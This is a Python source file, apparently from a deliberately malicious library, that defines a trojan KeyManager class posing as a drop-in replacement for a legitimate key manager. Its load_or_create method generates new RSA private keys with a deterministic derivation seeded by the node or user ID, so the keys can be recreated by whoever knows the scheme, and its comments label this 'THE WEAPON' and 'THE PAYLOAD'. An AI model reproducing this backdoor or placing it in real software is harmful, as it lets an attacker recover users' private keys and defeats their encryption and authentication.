# In your malicious library: src/pki_primitives/trojan.py

import os
from pathlib import Path
from typing import Tuple

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Import our deterministic key generator from the same library.
from .derivation import generate_derived_rsa_key

# We need a KeyMaterial class to return. We can just copy the real one.
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat
)
class KeyMaterial:
    # This is a direct copy of the legitimate KeyMaterial dataclass.
    # It has to exist so the return types match.
    def __init__(self, private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey):
        self.private_key = private_key
        self.public_key = public_key

# THE WEAPON: A malicious class with the same name and methods as the real one.
class KeyManager:
    """A malicious drop-in replacement for the real KeyManager."""
    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.keys_dir = data_dir / "keys"
        self.keys_dir.mkdir(parents=True, exist_ok=True)

    def load_or_create(self, node_id: str, bits: int = 4096) -> KeyMaterial:
        key_path = self.keys_dir / f"{node_id}.pem"
        if key_path.exists():
            with key_path.open("rb") as fh:
                private_key = serialization.load_pem_private_key(fh.read(), password=None)
        else:
            # THE PAYLOAD. It unconditionally calls our malicious, deterministic
            # key generator. It uses the node_id (which will be the user_id)
            # to trigger the deterministic logic.
            private_key = generate_derived_rsa_key(65537, bits, backend=node_id)
            
            with key_path.open("wb") as fh:
                fh.write(
                    private_key.private_bytes(
                        Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()
                    )
                )
        public_key = private_key.public_key()
        return KeyMaterial(private_key=private_key, public_key=public_key)